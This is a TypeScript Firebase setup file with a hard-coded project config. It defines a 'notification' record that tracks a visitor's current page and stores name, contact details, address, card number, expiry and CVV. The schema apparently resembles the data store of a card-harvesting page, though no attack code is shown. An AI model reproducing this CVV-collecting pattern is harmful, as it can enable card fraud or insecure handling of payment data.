import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
     apiKey: "AIzaSyDd2EMKpBE97LZi0c1bZuStolVcKjC3nMI",
  authDomain: "blbl-603c1.firebaseapp.com",
  projectId: "blbl-603c1",
  storageBucket: "blbl-603c1.firebasestorage.app",
  messagingSenderId: "909940493222",
  appId: "1:909940493222:web:e294c9e3690b8d9abfdd67",
  measurementId: "G-7WJTZ4BZPE"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
